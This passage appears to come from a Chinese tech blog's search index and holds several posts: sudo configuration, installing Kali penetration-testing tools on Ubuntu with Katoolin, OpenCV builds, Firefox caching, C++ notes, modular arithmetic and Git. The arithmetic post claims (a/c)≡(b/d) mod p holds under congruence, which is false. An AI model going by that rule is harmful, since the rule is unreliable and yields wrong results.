权限的特定命令后未能退出特权状态，你的系统可能会受到一些重大错误的波及。<code>sudo</code> 命令旨在允许您仅在真正需要时使用 root 权限，并控制每个 sudo 用户应具有的 root 权限。它也可以使你在使用完 root 特权之后轻松地回到普通用户的状态。</p><p>另外请注意，整个讨论的前提是你可以正常地访问 sudo，并且你的访问权限没有受限。详细的内容后面会介绍到。</p><p>还有一个选择就是使用一个不同的命令。如果通过编辑文件从而在其后添加内容是一种选择的话，你也许可以使用 <code>sudo vi /var/log/somelog</code>，虽然编辑一个活跃的日志文件通常不是一个好主意，因为系统可能会频繁的向这个文件中进行写入操作。</p><p>最后一个但是有点复杂的选择是，使用下列命令之一可以解决我们之前看到的问题，但是它们涉及到了很多复杂的语法。第一个命令允许你在得到 “没有权限” 的拒绝之后可以使用 <code>!!</code> 重复你的命令：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">echo</span> <span class="string">"Important note"</span> &gt;&gt; /var/log/somelog</span><br><span class="line">-bash: /var/log/somelog: Permission denied</span><br><span class="line">$ !!:gs/&gt;/|<span class="built_in">sudo</span> <span class="built_in">tee</span> -a /    &lt;=====</span><br><span class="line">$ <span class="built_in">tail</span> -1 /var/log/somelog</span><br><span class="line">Important note</span><br></pre></td></tr></tbody></table></figure><p>第二种是通过 <code>sudo</code> 命令，把你想要添加的信息传递给 <code>tee</code>。注意，<code>-a</code> 指定了你要<strong>附加</strong>文本到目标文件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo "Important note" | sudo tee -a /var/log/somelog</span><br><span class="line">$ tail -1 /var/log/somelog</span><br><span class="line">Important note</span><br></pre></td></tr></tbody></table></figure><h3 id="sudo-有多可控？"><a href="#sudo-有多可控？" class="headerlink" title="sudo 有多可控？"></a>sudo 有多可控？</h3><p>回答这个问题最快速的回答就是，它取决于管理它的人。大多数 Linux 的默认设置都非常简单。如果一个用户被安排到了一个特别的组中，例如 <code>wheel</code> 或者 <code>admin</code> 组，那这个用户无需知道 root 的密码就可以拥有运行任何命令的能力。这就是大多数 Linux 系统中的默认设置。一旦在 <code>/etc/group</code> 中添加了一个用户到了特权组中，这个用户就可以以 root 的权力运行任何命令。另一方面，可以配置 sudo，以便一些用户只能够以 root 身份运行单一指令或者一组命令中的任何一个。</p><p>如果把像下面展示的这些行添加到了 <code>/etc/sudoers</code> 文件中，例如 “nemo” 这个用户可以以 root 身份运行 <code>whoami</code> 命令。在现实中，这可能不会造成任何影响，它非常适合作为一个例子。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># User alias specification</span><br><span class="line">nemo ALL=(root) NOPASSWD: WHOAMI</span><br><span class="line"># Cmnd alias specificationCmnd_Alias WHOAMI = /usr/bin/whoami</span><br></pre></td></tr></tbody></table></figure><p>注意，我们添加了一个命令别名（<code>Cmnd_Alias</code>），它指定了一个可以运行的命令的全路径，以及一个用户别名，允许这个用户无需密码就可以使用 <code>sudo</code> 执行的单个命令。</p><p>当 nemo 运行 <code>sudo whoami</code> 命令的时候，他将会看到这个：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo whoami</span><br><span class="line">root</span><br></pre></td></tr></tbody></table></figure><p>注意这个，因为 nemo 使用 <code>sudo</code> 执行了这条命令，<code>whoami</code> 会显示该命令运行时的用户是 <code>root</code>。</p><p>至于其他的命令，nemo 将会看到像这样的一些内容：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo date</span><br><span class="line">[sudo] password for nemo:</span><br><span class="line">Sorry, user nemo is not allowed to execute '/bin/date' as root on butterfly.</span><br></pre></td></tr></tbody></table></figure><h3 id="sudo-的默认设置"><a href="#sudo-的默认设置" class="headerlink" title="sudo 的默认设置"></a>sudo 的默认设置</h3><p>在默认路径中，我们会利用像下面展示的 <code>/etc/sudoers</code> 文件中的几行：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo egrep "admin|sudo" /etc/sudoers</span><br><span class="line"># Members of the admin group may gain root privileges</span><br><span class="line">%admin ALL=(ALL) ALL        &lt;=====</span><br><span class="line"># Allow members of group sudo to execute any command</span><br><span class="line">%sudo ALL=(ALL:ALL) ALL     &lt;=====</span><br></pre></td></tr></tbody></table></figure><p>在这几行中，<code>%admin</code> 和 <code>%sudo</code> 都说明了任何添加到这些组中的人都可以使用 <code>sudo</code> 命令以 root 的身份运行任何命令。</p><p>下面列出的是 <code>/etc/group</code> 中的一行，它意味着每一个在该组中列出的成员，都拥有了 sudo 特权，而无需在 <code>/etc/sudoers</code> 中进行任何修改。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo:x:27:shs,nemo</span><br></pre></td></tr></tbody></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>sudo</code> 命令意味着你可以根据需要轻松地部署超级用户的访问权限，而且只有在需要的时候才能赋予用户非常有限的特权访问权限。你可能会遇到一些与简单的 <code>sudo command</code> 不同的问题，不过在 <code>sudo</code> 的回应中应该会显示你遇到了什么问题。</p><hr><p>来自<a href="https://linux.cn/article-10310-1.html">https://linux.cn/article-10310-1.html</a></p><p>via: <a href="https://www.networkworld.com/article/3322504/linux/selectively-deploying-your-superpowers-on-linux.html">https://www.networkworld.com/article/3322504/linux/selectively-deploying-your-superpowers-on-linux.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Ubuntu中使用Katoolin安装Kali Linux Tools</title>
      <link href="/posts/50854/"/>
      <url>/posts/50854/</url>
      
        <content type="html"><![CDATA[<p>本文将引导您逐步在Ubuntu中使用Katoolin安装Kali Linux Tools。对于那些不知道的人，<strong>Katoolin</strong>是一个Python脚本，可用于一次安装所有Kali Linux工具或手动一次安装。Kali Linux具有300多种渗透测试工具。除了安装所有工具，您还可以使用Katoolin在Linux框中仅安装您选择的选择性工具。如果您想在Ubuntu或任何其他基于DEB的系统上尝试使用Kali Linux工具，则应该尝试一下Katoolin。它将在您的Ubuntu系统中添加Kali Linux存储库，以便您可以一次安装所有渗透测试工具，也可以仅安装必要的工具。Katoolin是完全免费的开源软件，并已在基于Debian的系统上经过正式测试。</p><h2 id="在Ubuntu-18-04-LTS中安装Katoolin"><a href="#在Ubuntu-18-04-LTS中安装Katoolin" class="headerlink" title="在Ubuntu 18.04 LTS中安装Katoolin"></a>在Ubuntu 18.04 LTS中安装Katoolin</h2><p>我已经在Ubuntu 18.04 LTS服务器版本中测试了Katoolin。但是，它应该可以在其他Ubuntu版本和派生版本上使用。</p><p>确保在Ubuntu系统中安装了以下先决条件。</p><ul><li>Python 2.7</li><li>Git</li></ul><p>这些软件包在Ubuntu的默认源中可用，因此您可以使用apt软件包管理器进行安装。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python git</span><br></pre></td></tr></tbody></table></figure><p>另外，请确保已启用**[Universe]**源。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository Universe</span><br></pre></td></tr></tbody></table></figure><p>这是我的测试机详细信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cuiqingwei@Gary-Aspire-4739:/usr/bin$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 18.04.3 LTS</span><br><span class="line">Release:18.04</span><br><span class="line">Codename:bionic</span><br><span class="line">cuiqingwei@Gary-Aspire-4739:/usr/bin$ python -V</span><br><span class="line">Python 2.7.15+</span><br><span class="line">cuiqingwei@Gary-Aspire-4739:/usr/bin$ git --version</span><br><span class="line">git version 2.17.1</span><br><span class="line">cuiqingwei@Gary-Aspire-4739:/usr/bin$</span><br></pre></td></tr></tbody></table></figure><p>python和git版本</p><p>好吧，我们已经准备就绪。安装必备组件后，如下所示安装Katoolin：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/LionSec/katoolin.git</span><br></pre></td></tr></tbody></table></figure><p>上面的命令会将katoolin存储库克隆到当前工作目录中名为<strong>“ katoolin”</strong>的文件夹中。</p><p>接下来，将Katoolin二进制文件复制到您的路径，例如**/ usr / bin /**，如下所示。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cp katoolin / katoolin.py / usr / bin / katoolin</span><br></pre></td></tr></tbody></table></figure><p>最后，将Katoolin二进制文件设置为可执行文件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chmod + x / usr / bin / katoolin</span><br></pre></td></tr></tbody></table></figure><p>现在，我们已经安装了Katoolin。让我们继续前进，看看如何使用它。</p><h2 id="使用Katoolin安装Kali-Linux-Tools"><a href="#使用Katoolin安装Kali-Linux-Tools" class="headerlink" title="使用Katoolin安装Kali Linux Tools"></a>使用Katoolin安装Kali Linux Tools</h2><p>所有命令都应以root用户或<strong>sudo</strong>特权运行。</p><p>要启动Katoolin，请运行以下命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo katoolin</span><br></pre></td></tr></tbody></table></figure><p>这就是katoolin命令行界面的样子。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> $$\   $$\             $$\                         $$\ $$\           </span><br><span class="line"> $$ | $$  |            $$ |                        $$ |\__|          </span><br><span class="line"> $$ |$$  /  $$$$$$\  $$$$$$\    $$$$$$\   $$$$$$\  $$ |$$\ $$$$$$$\  </span><br><span class="line"> $$$$$  /   \____$$\ \_$$  _|  $$  __$$\ $$  __$$\ $$ |$$ |$$  __$$\ </span><br><span class="line"> $$  $$&lt;    $$$$$$$ |  Kali linux tools installer |$$ |$$ |$$ |  $$ |</span><br><span class="line"> $$ |\$$\  $$  __$$ |  $$ |$$\ $$ |  $$ |$$ |  $$ |$$ |$$ |$$ |  $$ |</span><br><span class="line"> $$ | \$$\ \$$$$$$$ |  \$$$$  |\$$$$$$  |\$$$$$$  |$$ |$$ |$$ |  $$ |</span><br><span class="line"> \__|  \__| \_______|   \____/  \______/  \______/ \__|\__|\__|  \__| V2.0 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> + -- -- +=[ Author: LionSec | Homepage: www.neodrix.com</span><br><span class="line"> + -- -- +=[ 331 Tools </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[W] Before updating your system , please remove all Kali-linux repositories to avoid any kind of problem .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1) Add Kali repositories &amp; Update </span><br><span class="line">2) View Categories</span><br><span class="line">3) Install classicmenu indicator</span><br><span class="line">4) Install Kali menu</span><br><span class="line">5) Help</span><br><span class="line"></span><br><span class="line">kat &gt;</span><br></pre></td></tr></tbody></table></figure><p>启动Katoolin</p><p>如上所示，Katoolin主界面有四个选项。输入数字以打开相应的子菜单。让我们一一看。</p><h3 id="1-添加Kali存储库并更新"><a href="#1-添加Kali存储库并更新" class="headerlink" title="1.添加Kali存储库并更新"></a>1.添加Kali存储库并更新</h3><p>该选项使您可以将kali Linux存储库添加到Linux系统。为此，请键入 <strong>1</strong>（数字1）以添加存储库。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1) Add Kali repositories &amp; Update </span><br><span class="line">2) View Categories</span><br><span class="line">3) Install classicmenu indicator</span><br><span class="line">4) Install Kali menu</span><br><span class="line">5) Help</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kat &gt; 1</span><br></pre></td></tr></tbody></table></figure><p>添加Kali存储库</p><p>将打开一个子菜单。再次输入<strong>1</strong>以添加Kali-linux存储库。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kat &gt; 1</span><br><span class="line"></span><br><span class="line">1) Add kali linux repositories</span><br><span class="line">2) Update</span><br><span class="line">3) Remove all kali linux repositories</span><br><span class="line">4) View the contents of sources.list file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">What do you want to do ?&gt; 1</span><br></pre></td></tr></tbody></table></figure><p>然后，键入<strong>2</strong>以更新存储库：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Executing: /tmp/apt-key-gpghome.MvaSscaYwv/gpg.1.sh --keyserver pool.sks-keyservers.net --recv-keys ED444FF07D8D0BF6</span><br><span class="line">gpg: connecting dirmngr at '/tmp/apt-key-gpghome.MvaSscaYwv/S.dirmngr' failed: IPC connect call failed</span><br><span class="line">gpg: keyserver receive failed: No dirmngr</span><br><span class="line"></span><br><span class="line">1) Add kali linux repositories</span><br><span class="line">2) Update</span><br><span class="line">3) Remove all kali linux repositories</span><br><span class="line">4) View the contents of sources.list file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">What do you want to do ?&gt; 2</span><br></pre></td></tr></tbody></table></figure><p>类型<strong>3</strong>，如果你想删除已添加的卡利Linux的存储库，并键入<strong>4</strong>，查看的sources.list文件的内容。</p><p>要返回上一菜单，请键入<strong>back</strong>，然后按Enter。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">What do you want to do ?&gt; back</span><br><span class="line">1) Add Kali repositories &amp; Update </span><br><span class="line">2) View Categories</span><br><span class="line">3) Install classicmenu indicator</span><br><span class="line">4) Install Kali menu</span><br><span class="line">5) Help</span><br><span class="line"></span><br><span class="line">kat &gt;</span><br></pre></td></tr></tbody></table></figure><p>要返回主菜单，请键入<strong>gohome，</strong>然后按Enter。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kat &gt; gohome</span><br><span class="line">1) Add Kali repositories &amp; Update </span><br><span class="line">2) View Categories</span><br><span class="line">3) Install classicmenu indicator</span><br><span class="line">4) Install Kali menu</span><br><span class="line">5) Help</span><br><span class="line"></span><br><span class="line">kat &gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="2-类别"><a href="#2-类别" class="headerlink" title="2.类别"></a>2.类别</h3><p>要查看所有可用类别列表，请在主菜单中键入<strong>2</strong>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kat &gt; 2</span><br><span class="line">**************************** All Categories *****************************</span><br><span class="line">1) Information Gathering8) Exploitation Tools</span><br><span class="line">2) Vulnerability Analysis9) Forensics Tools</span><br><span class="line">3) Wireless Attacks10) Stress Testing</span><br><span class="line">4) Web Applications11) Password Attacks</span><br><span class="line">5) Sniffing &amp; Spoofing12) Reverse Engineering</span><br><span class="line">6) Maintaining Access13) Hardware Hacking</span><br><span class="line">7) Reporting Tools 14) Extra</span><br><span class="line">0) All</span><br><span class="line">Select a category or press (0) to install all Kali linux tools .</span><br></pre></td></tr></tbody></table></figure><p>如您在上面的输出中看到的，有<strong>14个</strong>类别可用。您可以一次安装所有它们，也可以通过输入相应的类别编号来安装任何特定类别。</p><p>要安装所有kali Linux工具，请键入<strong>0</strong>（零），然后按Enter键。这将安装所有工具。需要一段时间，具体取决于Internet的速度。另外，请确保硬盘驱动器中有足够的可用空间。安装所有Kali Linux可能会占用大量磁盘空间。</p><p>如果您不具备所有工具，则只需安装要使用的工具即可。举例来说，要在“ <strong>漏洞利用工具”</strong>类别下安装<strong>工具</strong>，请键入<strong>8</strong>并按Enter。它将显示一个子菜单，并列出此类别中的所有可用软件包。您可以通过键入<strong>0</strong>（零）来安装该类别中的所有工具，或者键入任何特定的数字以将特定工具安装在“利用工具”类别下。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kat &gt; 8</span><br><span class="line"></span><br><span class="line">=+[ Exploitation Tools</span><br><span class="line"></span><br><span class="line">1) Armitage</span><br><span class="line"> 2) Backdoor Factory</span><br><span class="line"> 3) BeEF</span><br><span class="line"> 4) cisco-auditing-tool</span><br><span class="line"> 5) cisco-global-exploiter </span><br><span class="line"> 6) cisco-ocs</span><br><span class="line"> 7) cisco-torch</span><br><span class="line"> 8) commix</span><br><span class="line"> 9) crackle</span><br><span class="line">10) jboss-autopwn</span><br><span class="line">11) Linux Exploit Suggester</span><br><span class="line">12) Maltego Teeth</span><br><span class="line">13) SET</span><br><span class="line">14) ShellNoob</span><br><span class="line">15) sqlmap</span><br><span class="line">16) THC-IPV6</span><br><span class="line">17) Yersinia</span><br><span class="line"></span><br><span class="line">0) Install all Exploitation Tools</span><br><span class="line"></span><br><span class="line">Insert the number of the tool to install it .</span><br><span class="line"></span><br><span class="line">kat &gt;</span><br></pre></td></tr></tbody></table></figure><p>要返回上<strong>一级</strong>菜单，请键入<strong>back</strong>，然后要返回主菜单，请键入<strong>gohome</strong>。</p><h3 id="3-安装ClassicMenu指示器"><a href="#3-安装ClassicMenu指示器" class="headerlink" title="3.安装ClassicMenu指示器"></a>3.安装ClassicMenu指示器</h3><p>ClassicMenu Indicator是Ubuntu桌面环境顶部面板的通知区域小程序。它为那些喜欢Unity破折号菜单的人提供了一种获取经典GNOME风格应用程序菜单的简单方法。像经典的GNOME菜单一样，它包含Wine游戏和应用程序（如果已安装）。</p><p>要安装它，请键入<strong>3</strong>并按Enter，然后键入y进行确认并安装。</p><h3 id="4-安装Kali菜单"><a href="#4-安装Kali菜单" class="headerlink" title="4.安装Kali菜单"></a>4.安装Kali菜单</h3><p>要安装Kali Menu，请键入<strong>4，</strong> 然后键入 <strong>y</strong> 以确认安装。</p><p>使用Katoolin完成操作后，按 <strong>“ Ctrl + C”</strong>退出。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kat &gt; ^CShutdown requested...Goodbye...</span><br></pre></td></tr></tbody></table></figure><p>就这样。如您所见，Katoolin是非常简单易用的工具，它提供了一种在Ubuntu Linux盒子中安装Kali Linux工具的简便方法。您并不总是需要Kali Linux来尝试所有取证，渗透和安全测试工具。Katoolin将在任何基于DEB的Linux系统中轻松为您完成此任务。试试看，您不会失望的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态编译opencv库</title>
      <link href="/posts/19264/"/>
      <url>/posts/19264/</url>
      
        <content type="html"><![CDATA[<p><strong>一、准备</strong>：<br>    1.cmake<br>    2.opencv源码 （<a href="https://opencv.org/releases/%EF%BC%89">https://opencv.org/releases/）</a><br>opencv源码从官网下载源码解压后应该是这样<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19264/20200420204912815.png" alt="在这里插入图片描述"><br><strong>二、编译</strong><br>1.设置源码路径和编译后路径<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19264/20200420205137252.png" alt="在这里插入图片描述"><br>2.点击configure,然后选择配置编译器和编译的opencv库的位数这里我选64位，点击finish：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19264/20200420205232711.png" alt="在这里插入图片描述"><br>3.等待<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19264/20200420205322192.png" alt="在这里插入图片描述"><br>4.勾选一下可选设置</p><p>（1）、勾选“BUILD_opencv_world”，最后生成一个头文件库，相比之前的一堆头文件方便多了。 </p><p>（2）、添加下载好的modules到OPENCV_EXTRA_MODULES_PATH。</p><p>OPENCV_EXTRA_MODULES_PATH配置说明：由于OpenCV功能越来越臃肿，OpenCV3改变了项目架构，使用内核+插件的架构形式。 因此，OpenCV从2.x到4.x是一个很大的转变，对于很多功能不完善、性能不稳定的模块，都被放到了extra_modules（扩展模块）里面了。在Github中，除了存放正式版OpenCV的主仓库和新增加的OpenCV_extra仓库外，还添加了一个OpenCV_contrib的全新仓库，功能有：脸部识别、文本识别、边缘检测、追踪算法等，里面存放的是功能未稳定的代码，如果需要使用这些功能，就需要重新进行编译。</p><p>各个版本的opencv_contrib下载地址如下：<a href="https://github.com/opencv/opencv_contrib/releases">https://github.com/opencv/opencv_contrib/releases</a></p><p>（3）、如果要编译opencv的静态库，则需要去掉BUILD_SHARED_LIBS的对勾。</p><p>5.配置完成后，点击Generate,等待完成，需要一定时间。红色框体显示Generate完成</p><p>6.点击open Project按钮，打开我们编译生成的工程，选择：生成—批生成：配置完后，点击生成</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改火狐缓存位置到内存盘</title>
      <link href="/posts/13213/"/>
      <url>/posts/13213/</url>
      
        <content type="html"><![CDATA[<p>1、在地址栏输入about:config 进入设置界面</p><p>2、找到browser.cache.memory.max_entry_size设置使用内存缓存大小，设置值为-1，无限制，可以自己选择，设1的话是1kb，依次类推。</p><p>3、输入browser.cache.memory.enable，确认值为true，火狐默认为true。</p><p>4、输入”browser.cache.disk.enable”, 设置为false</p><p>5、然后在选项-高级-网络里，把无视自动缓存管理勾上，再把使用磁盘缓存空间设为0。</p><p>这样火狐的缓存就在内存里了。</p><p>比较简单，我这里就不上图片了。</p><p>最后输入 about:cache 可以查看缓存占用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++杂七杂八的笔记</title>
      <link href="/posts/49948/"/>
      <url>/posts/49948/</url>
      
        <content type="html"><![CDATA[<p>VS 2017 IDE compiler option” /permissive-“</p><p>类中成员变量的声明顺序，决定了成员变量的初始化顺序。假设 Date 类中的构造函数为：</p><p>public:    Date() ： y_(2016), m_(9), d_(22) {}</p><p> 此时，类中的成员函数，在类中的声明顺序 = 构造函数初始化列表顺序，故 y_, m_, d_ 都能被顺利的初始化为对应的值。</p><p> 而当成员变量，在类中的声明顺序 ≠ 构造函数初始化列表顺序 时，</p><p>public:    Date() ： y_(2016), d_(22), m_(d_-13) {}</p><p> 根据成员变量的声明顺序，y_ 首先被初始化为 2016，然后再初始化 m_，但由于 d_ 并未被初始化，所以 m_ 的值是随机的，最后初始化 d_ 为 22</p><p> 这是因为，<strong>类的成员变量在初始化时，其初始化的顺序只与声明顺序有关，而与在初始化列表中的顺序无关。</strong></p><p><strong>scanf函数返回成功读入的数据项数，读入数据时遇到了“文件结束”则返回EOF。</strong></p><p><strong>win 换行\r\n  linux \n  mac \r  linux读取win的文件会读\r\n</strong></p><p><strong>算法竞赛入门经典 46页</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模运算规则</title>
      <link href="/posts/56689/"/>
      <url>/posts/56689/</url>
      
        <content type="html"><![CDATA[<p>模运算与基本四则运算有些相似，但是除法例外。其规则如下： </p><p>(a + b) % p = (a % p + b % p) % p </p><p>(a - b) % p = (a % p - b % p) % p </p><p>(a * b) % p = (a % p * b % p) % p </p><p>(a^b) % p = ((a % p)^b) % p</p><p>推论： </p><p>若a≡b (% p)，则对于任意的c，都有(a + c) ≡ (b + c) (%p)； </p><p>若a≡b (% p)，则对于任意的c，都有(a * c) ≡ (b * c) (%p)； </p><p>若a≡b (% p)，c≡d (% p)，则 (a + c) ≡ (b + d) (%p)，(a - c) ≡ (b - d) (%p)， </p><p>(a * c) ≡ (b * d) (%p)，(a / c) ≡ (b / d) (%p)；</p><p>费马定理：若p是素数，a是正整数且不能被p整除，则：a^(p-1) mod p = 1 mod p </p><p>推论：若p是素数，a是正整数且不能被p整除，则：a^p mod p = a mod p</p>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些个人常用的 Git 指令</title>
      <link href="/posts/57752/"/>
      <url>/posts/57752/</url>
      
        <content type="html"><![CDATA[<blockquote><p>随便整理的一些自用的Git指令</p></blockquote><h2 id="GitHub创建仓库提示代码"><a href="#GitHub创建仓库提示代码" class="headerlink" title="GitHub创建仓库提示代码"></a><strong>GitHub创建仓库提示代码</strong></h2><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo "# 项目名" &gt;&gt; README.md</span><br><span class="line">git init</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m "first commit"</span><br><span class="line">git remote add origin git@github.com:qiubaiying/项目名.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></tbody></table></figure><p>若仓库存在直接push</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:qiubaiying/test.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></tbody></table></figure><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a><strong>常用操作</strong></h2><h3 id="创建仓库（初始化）"><a href="#创建仓库（初始化）" class="headerlink" title="创建仓库（初始化）"></a><strong>创建仓库（初始化）</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在当前指定目录下创建</span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line">新建一个仓库目录</span><br><span class="line">git init [project-name]</span><br><span class="line"></span><br><span class="line">克隆一个远程项目</span><br><span class="line">git clone 